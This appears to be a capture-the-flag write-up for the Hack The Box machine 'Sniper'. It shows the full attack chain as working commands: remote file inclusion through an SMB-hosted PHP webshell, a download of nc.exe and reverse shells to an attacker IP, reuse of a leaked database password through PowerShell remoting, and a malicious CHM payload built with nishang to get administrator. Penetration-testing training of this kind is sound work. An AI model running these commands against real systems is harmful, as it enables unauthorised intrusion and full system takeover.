# Sniper

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.229.6
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 09:19 EDT
Nmap scan report for 10.129.229.6
Host is up (0.011s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49667/tcp open  unknown
```

### Sniper Co

Port 80 is hosting a corporate website:

<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

I clicked all the services, and found that Our Services works and brings us to `/blog/index.php`.&#x20;

<figure><img src="../../../.gitbook/assets/image (182) (3).png" alt=""><figcaption></figcaption></figure>

When changing languages, I noticed this:

<figure><img src="../../../.gitbook/assets/image (198).png" alt=""><figcaption></figcaption></figure>

This looks vulnerable to LFI, and since this is a Windows machine, we can try to use `\\` to access our machien via SMB. I hosted a `cmd.php` webshell using `smbserver.py`. Then, we can try to access it via `curl`.

```bash
curl 'http://10.129.229.6/blog/?lang=\\10.10.14.13\share\cmd.php&cmd=whoami'
<TRUNCATED>
nt authority\iusr
```

This works! We can now get a reverse shell using `nc.exe`.

<pre class="language-bash" data-overflow="wrap"><code class="lang-bash">curl 'http://10.129.229.6/blog/?lang=\\10.10.14.13\share\cmd.php&#x26;cmd=powershell+-c+wget+10.10.14.13/nc64.exe+-Outfile+C:\windows\tasks\nc.exe'

<strong>curl 'http://10.129.229.6/blog/?lang=\\10.10.14.13\share\cmd.php&#x26;cmd=C:\windows\tasks\nc.exe+-e+cmd.exe+10.10.14.13+4444'
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/image (158).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Chris Credentials

Within the files for the website, we can see a `user` directory:

```
C:\inetpub\wwwroot>dir
Volume in drive C has no label.
Volume Serial Number is AE98-73A8

Directory of C:\inetpub\wwwroot

04/11/2019  10:51 AM    <DIR>          .
04/11/2019  10:51 AM    <DIR>          ..
04/11/2019  05:23 AM    <DIR>          blog
04/11/2019  05:23 AM    <DIR>          css
04/11/2019  05:23 AM    <DIR>          images
04/11/2019  05:22 PM             2,635 index.php
04/11/2019  05:23 AM    <DIR>          js
04/11/2019  05:23 AM    <DIR>          scss
10/01/2019  08:44 AM    <DIR>          user
               1 File(s)          2,635 bytes
               8 Dir(s)   2,415,136,768 bytes free
```

Within that, there is a `db.php` file that contains credentials:

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

This might be the credentials for the user, `Chris`. When we check the user's permissions, we se that he's part of the Remote Management Use group, meaning that we can use this credentials using Remote Powershell to get RCE.

```
C:\inetpub\wwwroot\user>net user chris
User name                    Chris
Full Name                    
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            4/11/2019 6:53:37 AM
Password expires             Never
Password changeable      4/11/2019 6:53:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   8/15/2019 12:23:43 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use*Users                
Global Group memberships     *None                 
The command completed successfully.
```

This can be done like so:

```powershell
$pass = ConvertTo-SecureString "36mEAhz/B8xQ~2VM" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("sniper\chris", $pass)
Invoke-Command -Computer localhost -ScriptBlock { whoami } -Credential $cred
# for shell
Invoke-Command -Computer localhost -ScriptBlock { \\10.10.14.13\share\nc64.exe -e cmd.exe 10.10.14.13 4444 } -Credential $cred
```

<figure><img src="../../../.gitbook/assets/image (149).png" alt=""><figcaption></figcaption></figure>

Now, we can execute `nc.exe` file to get another reverse shell and grab the user file.

<figure><img src="../../../.gitbook/assets/image (160) (4).png" alt=""><figcaption></figcaption></figure>

### CHM

As the user, we can view `C:\Docs`. Inside, there are some files, including a note.

{% code overflow="wrap" %}
```
C:\Docs>type note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```
{% endcode %}

Within the user's Downloads file, we find a `chm` file.

```
C:\Users\Chris\Downloads>ir
dir
 Volume in drive C has no label.
 Volume Serial Number is AE98-73A8

 Directory of C:\Users\Chris\Downloads

04/11/2019  08:36 AM    <DIR>          .
04/11/2019  08:36 AM    <DIR>          ..
04/11/2019  08:36 AM            10,462 instructions.chm
               1 File(s)         10,462 bytes
               2 Dir(s)   2,421,116,928 bytes free
```

We can transfer this back to our machine via SMB for further analysis. This is a Windows file, so we can open it on our Windows machine.

<figure><img src="../../../.gitbook/assets/image (68) (4).png" alt=""><figcaption></figcaption></figure>

Interesting. CHM is exploitable by us, and we can use `nishang` to do so. All we need to do is use `Out-CHM.ps1` to create a CHM file with a payload.

```powershell
# on Windows
Out-CHM -Payload "\\10.10.14.13\share\nc.exe -e cmd.exe 10.10.14.13 4444" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```

This would generate another CHM file, of which we just need to download it to the machine and rename it as `instructions.chm` and place it within `C:\Docs`. Then, we just need to wait a bit and our listener port will catch a reverse shell as the administrator.&#x20;

```
$ nc -lnvp 4444                        
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.229.6] 49675
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog>whoami
whoami
sniper\administrator
```
